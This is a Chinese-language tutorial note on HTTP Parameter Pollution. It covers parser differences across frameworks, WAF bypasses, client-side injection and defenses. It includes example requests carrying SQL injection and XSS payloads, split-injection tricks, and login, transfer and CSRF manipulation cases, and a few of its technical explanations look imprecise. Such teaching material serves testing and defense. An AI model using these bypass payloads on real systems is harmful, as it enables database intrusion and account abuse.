# HTTP 参数污染 (HTTP Parameter Pollution, HPP)

> 核心原理：HTTP 协议本身没有规定如何处理同名参数。不同后端框架/服务器对重复参数的解析策略存在天然差异。攻击者利用 WAF 与后端之间、或服务端与客户端之间的解析不一致，实现绕过。

---

## 一、根本原因：HTTP 协议的空白地带

### 1.1 协议未定义同名参数的行为

RFC 3986（URI 规范）和 HTTP/1.1 都**没有规定**一个请求中出现多个同名参数时应如何处理。请求 `?a=1&a=2` 中的两个 `a`，法律上是完全合法的——只是没人告诉你该取哪个。

这个空白地带催生了不同的实现选择：

```
GET /search?q=safe&q=malicious HTTP/1.1
```

| 实现 | 解析结果 | 代表性技术栈 |
|------|---------|------------|
| **取第一个** | `q=safe` | JSP/Tomcat, Python Flask, Go `r.URL.Query().Get()`, mod_wsgi/Apache, Perl CGI, IBM HTTP Server |
| **取最后一个** | `q=malicious` | PHP/Apache, Python Django, Ruby on Rails, PHP/Zeus |
| **拼接全部** | `q=safe,malicious` | ASP.NET/IIS, ASP/IIS, Node.js |
| **转为数组** | `q=['safe','malicious']` | Python/Zope, Go `r.URL.Query()["param"]` |

### 1.2 为什么会产生差异

每种实现都是合理的选择——取第一个遵循"先到先得"，取最后一个遵循"后发覆盖"，拼接全部或转为数组则保留完整信息。问题不在于哪种选择更正确，而在于**两个同时处理这个请求的系统做出了不同的选择**。

---

## 二、攻击模型：Server-Side HPP

### 2.1 WAF 绕过是最经典的应用

```
请求流:
  浏览器 → [WAF] → [后端服务器] → [数据库]

攻击策略:
  构造一个请求，让 WAF 看到"安全"的值，但后端使用"恶意"的值
```

### 2.2 具体场景：PHP 后端 + WAF 取第一个参数

```http
GET /search?q=safe&q=' UNION SELECT 1,2,3-- HTTP/1.1
Host: target.com
```

**WAF 的视角**：`q=safe` → 安全，放行。

**PHP 的视角**（`$_GET['q']` 取最后一个）：`' UNION SELECT 1,2,3--` → SQL 注入。

**生效条件**：
- WAF 解析第一个 `q` 而 PHP 取最后一个 `q`
- 恰好是：WAF 部署在反向代理层（取第一个），PHP/Apache 后端取最后一个

### 2.3 反向场景：ASP.NET 后端 + WAF 取最后一个参数

```http
GET /search?q=' UNION&q= SELECT&q= 1,2,3-- HTTP/1.1
Host: target.com
```

**WAF 的视角**（取最后一个）：`1,2,3--` → 看起来无害。

**ASP.NET/IIS 的视角**（拼接全部，逗号分隔）：`' UNION, SELECT, 1,2,3--` → 逗号来自 ASP.NET 自身的拼接规则，WAF 看到的却是三个分散的片段。

---

## 三、攻击模型：Client-Side HPP

### 3.1 原理

当服务端拥有两套参数处理逻辑——一套用第一个参数生成页面，另一套用最后一个参数影响 JavaScript 变量——攻击者可以让网页渲染出恶意代码。

```http
GET /profile?name=Alice&name=<script>alert(1)</script> HTTP/1.1
```

如果后端：
1. 取第一个 `name=Alice` 生成 `<h1>Welcome Alice</h1>`
2. 取最后一个 `name=<script>...</script>` 填充到 JavaScript 变量中：

```html
<script>
  var userName = '<script>alert(1)</script>';
</script>
```

脚本闭合了变量赋值，注入了 JS 代码。

### 3.2 HPP + DOM XSS 组合

```http
GET /search?q=test&q=";alert(1);// HTTP/1.1
```

后端用第一个 `q` 渲染页面标题，用最后一个 `q` 填充如下代码：

```html
<script>
  var query = "";alert(1);//";
</script>
```

HPP 在此充当了一个"间接注入通道"——通过参数覆盖将恶意代码传入原本不可能接触到的变量。

---

## 四、参数名称变体

### 4.1 数组语法 `[]`

部分框架将 `param[]=a&param[]=b` 解析为数组 `['a', 'b']`，但与其他变体混用时行为不可预测。

```http
-- 混合普通参数和数组参数
?id=1&id[]=2
?id[]=1&id=2
```

| 技术栈 | `param=1&param[]=2` | `param[]=1&param=2` |
|--------|--------------------|--------------------|
| PHP | `param = 2`（`[]` 覆盖） | `param = 2`（后者覆盖） |
| ASP.NET | `param = 1`, `param[] = 2`（分开存储） | 同左 |
| Node.js (Express) | `param = ['1','2']`（合并为数组） | `param = ['1','2']` |

### 4.2 URL 编码的隐蔽参数

```http
-- 利用编码将 & 隐藏为 %26，使 WAF 仅看到一个参数
GET /search?q=safe%26q=' UNION SELECT 1,2,3-- HTTP/1.1
```

WAF 看到 `q=safe&q=' UNION SELECT 1,2,3--`（一个参数 `q`，值很长），但后端可能：
- PHP 自动解析 `%26` 为 `&`，产生两个 `q` 参数
- 其他后端视 `%26` 为字面值

### 4.3 嵌套参数语法

```http
-- 部分框架支持 param[key]=value 语法
?user[name]=admin&user[role]=user
?user[name]=admin&user[name]=hacker
```

PHP 会将 `user[name]=admin&user[name]=hacker` 解析为 `$_GET['user']['name'] = 'hacker'`（后者覆盖）。

---

## 五、HPP 在 SQL 注入中的实战

### 5.1 覆盖注入 (Override Injection)

```http
GET /products?category=books&category=' UNION SELECT 1,2,3 FROM users-- HTTP/1.1
```

前提：WAF 取第一个 `category=books` → 正常业务值 → 放行。PHP 后端取最后一个 `category` → SQL 注入。

### 5.2 分片注入 (Split Injection)

适用于 ASP.NET 后端（拼接全部值）：

```http
GET /search?q=' UNION&q= SELECT&q= 1,2,3&q= FROM users-- HTTP/1.1
```

ASP.NET 拼接：`' UNION, SELECT, 1,2,3, FROM users--`

技巧：利用 ASP.NET 自带的逗号拼接，`UNION, SELECT` 在 SQL 中非法，需要配合其他绕过技术（如内联注释 `UNION/**/SELECT`）。

### 5.3 分片 + 内联注释组合

```http
GET /search?q=' UNION/*&q=*/SELECT&q= 1,2,3&q= FROM users-- HTTP/1.1
```

ASP.NET 拼接：`' UNION/*,*/SELECT, 1,2,3, FROM users--`

逗号仍存在但可能被部分 WAF 规则忽略（因为值已分散到多个参数中）。

---

## 六、各技术栈完整对照表

> 资料来源：PayloadsAllTheThings, OWASP WSTG v4.2

| 技术栈 | 解析策略 | HPP 结果 (`?a=1&a=2`) | WAF 绕过可利用性 |
|--------|---------|----------------------|----------------|
| **PHP/Apache** | 取最后一个 | `a=2` | 高 — PHP 取最后，多数 WAF 取第一个 |
| **PHP/Zeus** | 取最后一个 | `a=2` | 同上 |
| **ASP.NET/IIS** | 拼接全部值 | `a=1,2` | 中 — 逗号干扰 SQL 语法 |
| **ASP/IIS** | 拼接全部值 | `a=1,2` | 中 |
| **JSP/Servlet/Tomcat** | 取第一个 | `a=1` | 中 — WAF 取最后一个时可用 |
| **Python Django** | 取最后一个 | `a=2` | 同 PHP |
| **Python Flask** | 取第一个 | `a=1` | 同 JSP |
| **Python/Zope** | 转为数组 | `a=['1','2']` | 低 — 数组不直接拼接 SQL |
| **Ruby on Rails** | 取最后一个 | `a=2` | 同 PHP |
| **Node.js (Express)** | 转为数组 / 拼接 | `a=['1','2']` / `a=1,2` | 取决于具体用法 |
| **Go `r.URL.Query().Get()`** | 取第一个 | `a=1` | 同 JSP |
| **Go `r.URL.Query()["param"]`** | 转为数组 | `a=['1','2']` | 低 |
| **mod_wsgi/Apache** | 取第一个 | `a=1` | 同 JSP |
| **Perl CGI/Apache** | 取第一个 | `a=1` | 同 JSP |
| **IBM HTTP Server** | 取第一个 | `a=1` | 同 JSP |
| **IBM Lotus Domino** | 取第一个 | `a=1` | 同 JSP |

---

## 七、HPP 的多维利用路径

### 7.1 绕过认证

```http
POST /login HTTP/1.1

username=admin&username=hacker&password=any
```

后端使用第一个 `username` 做认证查询，但用最后一个记录操作日志或设置 Session——攻击者以 admin 身份查询失败，但可能获得 hacker 的访问上下文。

### 7.2 篡改业务逻辑

```http
POST /transfer HTTP/1.1

from=alice&to=bob&amount=100&amount=10000
```

WAF 检查 `amount=100` 符合限额 → 放行。后端取最后一个 `amount=10000` → 超额转账。

### 7.3 绕过 CSRF Token 校验

```http
POST /update-profile HTTP/1.1

csrf_token=valid_token&email=user@example.com&email=attacker@evil.com
```

WAF 或前置验证逻辑取第一个 `email` → 合法。后端取最后一个 → 攻击者的邮箱被写入。

---

## 八、防御措施

| 层级 | 措施 |
|------|------|
| **WAF 层** | WAF 必须与后端的参数解析策略保持一致——如果后端取最后一个，WAF 也应检查最后一个 |
| **应用层** | 不要依赖参数的隐式覆盖行为；显式检查参数数量 |
| **编码层** | 对所有参数值做 HTML/JS/SQL 上下文编码，不因来源（第一个还是最后一个）而有差异 |
| **架构层** | 使用强类型的参数绑定（如 RESTful API 的 JSON body），天然避免同名参数问题 |

---

## 九、快速测试方法

### 9.1 识别后端取参策略

```
1. 请求 /test?a=1&a=2
2. 观察响应/日志中 a 的值是 1、2、1,2 还是 ['1','2']
3. 对照上方对照表推断技术栈
```

### 9.2 验证 WAF 绕过

```
1. 请求 /search?q=safe&q=' OR '1'='1
2. 如果 WAF 不拦截（检查了第一个 safe），且页面行为异常 → HPP 绕过成功
3. 构造完整注入 payload
```

---

> **关联文档**：[[绕过技术总览]], [[SQL injection]], [[Union检测绕过]]
> **参考**：PayloadsAllTheThings — HTTP Parameter Pollution, OWASP WSTG v4.2 — Testing for HTTP Parameter Pollution, Acunetix — How to Detect HTTP Parameter Pollution Attacks (2024), Imperva — HTTP Parameter Pollution
